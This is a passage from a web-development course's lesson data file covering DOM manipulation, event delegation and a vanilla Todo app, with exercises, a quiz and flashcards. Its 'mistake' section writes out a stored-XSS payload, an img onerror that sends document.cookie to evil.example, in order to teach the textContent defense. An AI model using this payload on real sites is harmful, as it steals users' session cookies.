              "const form = document.querySelector(\"#todo-form\");",
              "",
              "form.addEventListener(\"submit\", (event) => {",
              "  event.preventDefault();      // we own the submit now — no reload",
              "  const data = Object.fromEntries(new FormData(form));",
              "  addTodo(data.title);          // the native gate already rejected invalid input",
              "  form.reset();",
              "});",
              "",
              "document.querySelector(\"#clear\").addEventListener(\"click\", (event) => {",
              "  console.log(event.target === event.currentTarget); // true here…",
              "});",
              "// …but click a <strong> INSIDE a button and target is the <strong>,",
              "// while currentTarget stays the button the listener lives on.",
            ].join("\n"),
          },
        ],
      },
      {
        heading: "Bubbling & delegation — one listener for a hundred buttons",
        body: [
          "Events don't stop where they land: a click on a <strong> inside an <li> bubbles upward, visiting every ancestor on its way to the document. Delegation exploits this: instead of attaching a listener to each delete button (and re-attaching every render), attach ONE listener to the stable parent, inspect event.target.closest('[data-action]'), and dispatch by the action attribute. New rows participate automatically — no wiring required.",
          "This solves the classic re-render bug for free: if render() rebuilds the list's innerHTML, per-item listeners die with their elements (or, worse, duplicate if you re-append). A delegated listener lives on the container, which render never replaces — it survives every redraw. data-attributes carry identity (data-id), the handler parses it, and state does the rest. Delegation is also how React's own event system works under the hood: one listener set at the root.",
        ],
        code: [
          {
            file: "delegation.js — stable parent, disposable children",
            lang: "js",
            code: [
              "// ONE listener on the list — survives every re-render:",
              "list.addEventListener(\"click\", (event) => {",
              "  const action = event.target.closest(\"[data-action]\");",
              "  if (!action) return;                    // clicked non-interactive space",
              "",
              "  const row = action.closest(\"li.todo\");",
              "  const id = Number(row.dataset.id);      // dataset is a string — convert",
              "",
              "  switch (action.dataset.action) {",
              "    case \"toggle\": return toggleTodo(id);",
              "    case \"delete\": return deleteTodo(id);",
              "  }",
              "});",
              "",
              "// rows can now be rebuilt freely; behavior rides on attributes:",
              "// <li class=\"todo\" data-id=\"7\">",
              "//   <span class=\"title\"></span>      ← filled via textContent",
              "//   <button data-action=\"toggle\">done</button>",
              "//   <button data-action=\"delete\">✕</button>",
              "// </li>",
            ].join("\n"),
          },
        ],
      },
      {
        heading: "The render loop — assembling the vanilla Todo skeleton",
        body: [
          "Every framework-shaped app is three parts wearing a costume: STATE (plain data — an array of todos), RENDER (a pure-ish function that redraws the UI from state: clear the list, build an element per todo with createElement + textContent + data-attributes, append), and ACTIONS (functions that produce NEW state — the immutability recipes from P02-L3 — then call render()). User intent never touches the DOM directly; it mutates state through an action, and the DOM is always a projection of state.",
          "Two refinements make the skeleton professional. Filtering lives in STATE (a filter variable: 'all' | 'open' | 'done') so render derives the visible list — the URL-state version of this exact idea arrives in Phase 9. And persistence is one listener: sync window.localStorage inside every action (or on a 'storage-safe' tick) — the try/catch guard from P00-L5 applies. This is your first cumulative milestone: Phase 1's semantics, native validation, and tokens; Phase 2's closures, immutability, and delegation — one working app.",
        ],
        code: [
          {
            file: "todo-skeleton.js — state → render → actions (milestone)",
            lang: "js",
            code: [
              "// ── STATE: the single source of truth ──",
              "let todos = [];            // [{ id, title, done }]",
              "let nextId = 1;",
              "const listEl = document.querySelector(\"#todos\");",
              "const formEl = document.querySelector(\"#todo-form\");",
              "",
              "// ── RENDER: the DOM is a projection of state ──",
              "function render() {",
              "  listEl.textContent = \"\";            // clear (safe: no parsing)",
              "  for (const todo of todos) {",
              "    const li = document.createElement(\"li\");",
              "    li.className = \"todo\";",
              "    li.dataset.id = String(todo.id);",
              "",
              "    const title = document.createElement(\"span\");",
              "    title.textContent = todo.title;    // USER DATA → textContent. Always.",
              "",
              "    const toggle = document.createElement(\"button\");",
              "    toggle.dataset.action = \"toggle\";",
              "    toggle.textContent = todo.done ? \"↺\" : \"✓\";",
              "",
              "    const del = document.createElement(\"button\");",
              "    del.dataset.action = \"delete\";",
              "    del.textContent = \"✕\";",
              "    del.setAttribute(\"aria-label\", `Delete ${todo.title}`);",
              "",
              "    li.append(title, toggle, del);",
              "    listEl.append(li);",
              "  }",
              "}",
              "",
              "// ── ACTIONS: new state, then re-render (immutability recipes) ──",
              "function addTodo(title) {",
              "  todos = [...todos, { id: nextId++, title, done: false }];",
              "  render();",
              "}",
              "function toggleTodo(id) {",
              "  todos = todos.map((t) => (t.id === id ? { ...t, done: !t.done } : t));",
              "  render();",
              "}",
              "function deleteTodo(id) {",
              "  todos = todos.filter((t) => t.id !== id);",
              "  render();",
              "}",
              "",
              "// ── WIRING: forms + one delegated listener ──",
              "formEl.addEventListener(\"submit\", (event) => {",
              "  event.preventDefault();",
              "  const data = Object.fromEntries(new FormData(formEl));",
              "  addTodo(String(data.title).trim());   // native validation ran first",
              "  formEl.reset();",
              "});",
              "",
              "listEl.addEventListener(\"click\", (event) => {",
              "  const action = event.target.closest(\"[data-action]\");",
              "  if (!action) return;",
              "  const id = Number(action.closest(\"li.todo\").dataset.id);",
              "  if (action.dataset.action === \"toggle\") toggleTodo(id);",
              "  if (action.dataset.action === \"delete\") deleteTodo(id);",
              "});",
              "",
              "render(); // first paint — from here on, state drives everything",
            ].join("\n"),
            caption: "Read it as a contract: handlers NEVER edit the DOM. They edit state; render() translates. React automates exactly this loop in Phase 4.",
          },
        ],
      },
    ],
    mistake: {
      title: "innerHTML with a guest inside",
      wrong: [
        "function renderComments(comments) {",
        "  box.innerHTML = comments",
        '    .map((c) => `<p><b>${c.author}</b>: ${c.body}</p>`)',
        "    .join(\"\");",
        "}",
        "// A comment body of:",
        '//   Nice post! <img src=x onerror="fetch(\'https://evil.example/steal?c=\'+document.cookie)">',
        "// renders as a REAL img tag. onerror fires. Session cookies just",
        "// took a trip. This is stored XSS — it attacks every future reader.",
      ].join("\n"),
      right: [
        "function renderComments(comments) {",
        "  box.textContent = \"\";             // clear without parsing",
        "  for (const c of comments) {",
        "    const p = document.createElement(\"p\");",
        "    const who = document.createElement(\"b\");",
        "    who.textContent = c.author;     // user data → text nodes only",
        "    p.append(who, document.createTextNode(`: ${c.body}`));",
        "    box.append(p);",
        "  }",
        "}",
        "// Same pixels. Zero parsing of user input. The img stays text.",
      ].join("\n"),
      explain:
        "innerHTML hands its string to the HTML parser — and parsers execute. Any user-controlled fragment (comment, username, URL param, database row a user wrote) becomes live markup: script tags, onerror handlers, fake login forms. The fix is structural, not sanitization-heroics: user data enters exclusively through textContent/setAttribute/value. Phase 30's security lab will make you reproduce this attack end-to-end; the rule you install today prevents it by architecture.",
    },
    tryIt: [
      "Open any page you built in Phase 1 and, from the console, querySelector three elements and restyle them via classList — no HTML edits allowed. Feel the difference between markup and live objects.",
      "Prove the snapshot: grab querySelectorAll('li') on a list, add an li via createElement+append, then check the old NodeList's length. It didn't grow. Explain why to the rubber duck.",
      "Reproduce the XSS hole in a scratch file: a <script> variable containing <img src=x onerror=\"alert('XSS')\"> fed through innerHTML vs through textContent. Watch one execute and the other sit there as text.",
      "Attach a click listener to a button containing a <strong>, and log event.target.tagName vs event.currentTarget.tagName. Click the text. Predict, verify, explain.",
      "Extend the Todo skeleton with an empty state: when todos.length === 0, render a semantic <p class=\"empty\">Nothing yet — add your first task.</p>. Where does that conditional belong — in state, render, or an action?",
    ],
    challenge: {
      prompt:
        "Extend the Todo skeleton into the full milestone app. Add: (1) a filter bar — three buttons All / Open / Done driven by a filter state variable ('all' | 'open' | 'done'), the active button marked with an aria-pressed='true' and a .active class; (2) a live counter '2 of 5 open' in a <p aria-live=\"polite\"> that updates on every render; (3) a 'Clear completed' button that removes finished todos immutably; (4) localStorage persistence — load on startup (guarded with try/catch), save after every action. Constraints: zero innerHTML with user data anywhere; all list behavior through ONE delegated listener; all state updates via the immutable recipes; verify with a title containing <script>alert(1)</script>.",
      hints: [
        "Filtering is derivation: const visible = todos.filter(t => filter === 'all' ? true : filter === 'open' ? !t.done : t.done). Render iterates visible; the counter derives from todos, not visible.",
        "The filter buttons can ALSO delegate: give them data-filter attributes and listen once on the bar container — the same closest('[data-filter]') pattern as the rows.",
        "Persistence shape: JSON.parse(localStorage.getItem('todos.v1') ?? '[]') inside try/catch at startup; a save() that writes JSON.stringify(todos) called at the end of every action (or inside render). nextId must survive reloads too.",
      ],
      solution: [
        "<!doctype html>",
        "<html lang=\"en\">",
        "<head>",
        "  <meta charset=\"utf-8\">",
        "  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">",
        "  <title>Todos — vanilla milestone</title>",
        "  <style>",
        "    * { box-sizing: border-box; margin: 0; }",
        "    body { font: 16px/1.6 system-ui; max-width: 34rem; margin: 2rem auto; padding: 0 1rem; }",
        "    .todo { display: flex; gap: .5rem; align-items: center; padding: .4rem 0; }",
        "    .todo .title { flex: 1; }",
        "    .todo.is-done .title { text-decoration: line-through; opacity: .55; }",
        "    .filters button.active { font-weight: 700; text-decoration: underline; }",
        "  </style>",
        "</head>",
        "<body>",
        "  <h1>Todos</h1>",
        "",
        "  <form id=\"todo-form\">",
        "    <label for=\"title\">New task</label>",
        "    <input id=\"title\" name=\"title\" required minlength=\"1\" autocomplete=\"off\">",
        "    <button type=\"submit\">Add</button>",
        "  </form>",
        "",
        "  <div class=\"filters\" role=\"group\" aria-label=\"Filter\">",
        "    <button type=\"button\" data-filter=\"all\" aria-pressed=\"true\">All</button>",
        "    <button type=\"button\" data-filter=\"open\" aria-pressed=\"false\">Open</button>",
        "    <button type=\"button\" data-filter=\"done\" aria-pressed=\"false\">Done</button>",
        "    <button type=\"button\" id=\"clear-done\">Clear completed</button>",
        "  </div>",
        "",
        "  <p id=\"counter\" aria-live=\"polite\"></p>",
        "  <ul id=\"todos\"></ul>",
        "",
        "  <script>",
        "    // ——— state (+ guarded persistence) ———",
        "    const KEY = \"todos.v1\";",
        "    let todos = [];   // [{ id, title, done }]",
        "    let nextId = 1;",
        "    let filter = \"all\";",
        "",
        "    try {",
        "      const saved = JSON.parse(localStorage.getItem(KEY) ?? \"null\");",
        "      if (Array.isArray(saved?.todos)) {",
        "        todos = saved.todos;",
        "        nextId = saved.nextId ?? todos.length + 1;",
        "      }",
        "    } catch { /* corrupted or unavailable storage: start fresh */ }",
        "",
        "    function save() {",
        "      try { localStorage.setItem(KEY, JSON.stringify({ todos, nextId })); }",
        "      catch { /* private mode: in-memory only */ }",
        "    }",
        "",
        "    // ——— render: DOM as a projection of state ———",
        "    const listEl = document.querySelector(\"#todos\");",
        "    const counterEl = document.querySelector(\"#counter\");",
        "",
        "    function render() {",
        "      const visible = todos.filter((t) =>",
        "        filter === \"all\" ? true : filter === \"open\" ? !t.done : t.done",
        "      );",
        "",
        "      listEl.textContent = \"\";",
        "      for (const todo of visible) {",
        "        const li = document.createElement(\"li\");",
        "        li.className = \"todo\" + (todo.done ? \" is-done\" : \"\");",
        "        li.dataset.id = String(todo.id);",
        "",
        "        const title = document.createElement(\"span\");",
        "        title.className = \"title\";",
        "        title.textContent = todo.title;      // user data → text ONLY",
        "",
        "        const toggle = document.createElement(\"button\");",
        "        toggle.type = \"button\";",
        "        toggle.dataset.action = \"toggle\";",
        "        toggle.textContent = todo.done ? \"reopen\" : \"done\";",
        "",
        "        const del = document.createElement(\"button\");",
        "        del.type = \"button\";",
        "        del.dataset.action = \"delete\";",
        "        del.textContent = \"✕\";",
        "        del.setAttribute(\"aria-label\", `Delete ${todo.title}`);",
        "",
        "        li.append(title, toggle, del);",
        "        listEl.append(li);",
        "      }",
        "",
        "      const open = todos.filter((t) => !t.done).length;",
        "      counterEl.textContent = `${open} of ${todos.length} open`;",
        "",
        "      document.querySelectorAll(\".filters [data-filter]\").forEach((b) => {",
        "        const on = b.dataset.filter === filter;",
        "        b.classList.toggle(\"active\", on);",
        "        b.setAttribute(\"aria-pressed\", String(on));",
        "      });",
        "    }",
        "",
        "    // ——— actions: immutable recipes, then render + save ———",
        "    function addTodo(title) {",
        "      todos = [...todos, { id: nextId++, title, done: false }];",
        "      render(); save();",
        "    }",
        "    function toggleTodo(id) {",
        "      todos = todos.map((t) => (t.id === id ? { ...t, done: !t.done } : t));",
        "      render(); save();",
        "    }",
        "    function deleteTodo(id) {",
        "      todos = todos.filter((t) => t.id !== id);",
        "      render(); save();",
        "    }",
        "    function clearDone() {",
        "      todos = todos.filter((t) => !t.done);",
        "      render(); save();",
        "    }",
        "",
        "    // ——— wiring: submit + two delegated listeners ———",
        "    const formEl = document.querySelector(\"#todo-form\");",
        "    formEl.addEventListener(\"submit\", (e) => {",
        "      e.preventDefault();                     // native validation already passed",
        "      const data = Object.fromEntries(new FormData(formEl));",
        "      addTodo(String(data.title).trim());",
        "      formEl.reset();",
        "    });",
        "",
        "    listEl.addEventListener(\"click\", (e) => {",
        "      const btn = e.target.closest(\"[data-action]\");",
        "      if (!btn) return;",
        "      const id = Number(btn.closest(\"li.todo\").dataset.id);",
        "      if (btn.dataset.action === \"toggle\") toggleTodo(id);",
        "      if (btn.dataset.action === \"delete\") deleteTodo(id);",
        "    });",
        "",
        "    document.querySelector(\".filters\").addEventListener(\"click\", (e) => {",
        "      const btn = e.target.closest(\"[data-filter]\");",
        "      if (btn) { filter = btn.dataset.filter; render(); }",
        "    });",
        "    document.querySelector(\"#clear-done\").addEventListener(\"click\", clearDone);",
        "",
        "    render();",
        "  </script>",
        "</body>",
        "</html>",
        "",
        "<!-- acceptance check: add a task titled <script>alert(1)</script> —",
        "     it must render as inert text. Reload the page — state persists.",
        "     Filter + counter + clear-completed all derive from state.",
        "     You just built, by hand, the loop React automates. -->",
      ].join("\n"),
    },
    quiz: [
      {
        q: "querySelectorAll returns…",
        options: ["A static NodeList — a snapshot that never sees later additions", "A live HTMLCollection", "An array you can push into", "The element's children only"],
        answer: 0,
        explain: "It captures matches at call time. Elements added afterwards are invisible to the old result — re-query or iterate fresh. (It's also not a true Array: no map without spreading.)",
      },
      {
        q: "Why is innerHTML + user data dangerous?",
        options: ["It parses the string as HTML, so injected markup and handlers execute", "It's slower than createElement", "It can't render text", "It removes event listeners"],
        answer: 0,
        explain: "The parser doesn't ask where the string came from — <img onerror=…>, script-adjacent payloads, and fake forms all become live DOM. User data enters via textContent/setAttribute/value only.",
      },
      {
        q: "event.target vs event.currentTarget:",
        options: ["target = the element actually clicked; currentTarget = the element the listener is attached to", "They're aliases", "target is always the document", "currentTarget only exists on forms"],
        answer: 0,
        explain: "Click a <strong> inside a button: target is the strong, currentTarget is the button. Delegation reads target (via closest) and dispatches on it.",
      },
      {
        q: "Event delegation works because…",
        options: ["Events bubble up ancestors, so one listener on a stable parent can serve all descendants", "Listeners are inherited like CSS", "The browser queues events", "data-attributes trigger handlers automatically"],
        answer: 0,
        explain: "A click visits every ancestor on its way to document. One listener + target.closest('[data-action]') serves infinite children — and survives re-renders that rebuild them.",
      },
      {
        q: "In the Todo skeleton, a delete button click should…",
        options: ["Call an action that produces new state, then re-render — never edit the DOM directly", "Remove the <li> from the DOM", "Set the todo's display to none", "Splice the array and refresh the page"],
        answer: 0,
        explain: "The DOM is a projection of state. Handlers change state through immutable actions; render() redraws. Bypassing this desyncs UI and truth — the bug class React exists to eliminate.",
      },
      {
        q: "preventDefault() on form submit…",
        options: ["Stops the browser's navigation/reload so your code handles the data", "Clears the form fields", "Disables validation", "Prevents bubbling"],
        answer: 0,
        explain: "Without it, the browser navigates (reloading your app). With it, FormData + your action pipeline take over. Stopping bubbling is a different method: stopPropagation.",
      },
    ],
    flashcards: [
      { front: "The DOM", back: "The browser's live object tree of your HTML. Every element is a JS object: query it, restyle it, build siblings, attach listeners." },
      { front: "querySelector / All", back: "First match (or null) / all matches as a STATIC NodeList snapshot. Guard null; re-query after adding elements." },
      { front: "textContent vs innerHTML", back: "textContent writes inert text — always safe for user data. innerHTML parses its string as live HTML — the XSS hole. The boundary is origin, not content." },
      { front: "XSS", back: "Cross-site scripting: user-supplied markup executing in other users' browsers. Vanilla defense: user data only via textContent/setAttribute/value." },
      { front: "Event bubbling", back: "Events fire on the target, then travel up every ancestor to document. Enables delegation; stopPropagation halts the climb (rarely needed)." },
      { front: "Event delegation", back: "One listener on a stable ancestor + event.target.closest('[data-action]'). Serves unlimited children and survives re-renders — React's own strategy at the root." },
      { front: "preventDefault", back: "Cancels the browser's default behavior (form reload, link navigation) so your handler owns the interaction. Different from stopPropagation." },
      { front: "Render loop", back: "state → render() draws the DOM as a projection → actions produce NEW state (immutable recipes) → render() again. The pattern every framework automates." },
    ],
    recap: [
      "The DOM is live objects: query, guard null, restyle via classList, read/write properties.",
      "User data enters as text — createElement + textContent; innerHTML is for strings you fully authored.",
      "One delegated listener on a stable parent beats N fragile child listeners.",
      "Forms: preventDefault, FormData, and the native validation gate from P01-L2.",
      "State → render → actions: you just built by hand what React automates — the milestone is yours.",
    ],
    references: [
      { label: "MDN — Introduction to the DOM", url: "https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model/Introduction" },
      { label: "MDN — Event bubbling and capture", url: "https://developer.mozilla.org/en-US/docs/Learn_web_development/Core/Scripting/Events#event_bubbling" },
      { label: "MDN — Element.closest()", url: "https://developer.mozilla.org/en-US/docs/Web/API/Element/closest" },
      { label: "OWASP — XSS (Cross-Site Scripting)", url: "https://owasp.org/www-community/attacks/xss/" },
      { label: "MDN — FormData", url: "https://developer.mozilla.org/en-US/docs/Web/API/FormData" },
    ],
    nextBridge:
      "Your app responds — but instantly. The web isn't: data travels, promises resolve, and the event loop decides who runs when. Next lesson brings fetch, the Promise lifecycle, and async/await — the network layer your Todo app will soon use to talk to a real server.",
  },
];

LESSONS_P2.push(...LESSON_CONTENT_P2B);

export const LESSON_CONTENT_P2: Record<string, LessonContent> = Object.fromEntries(
  LESSONS_P2.map((l) => [l.id, l]),
);
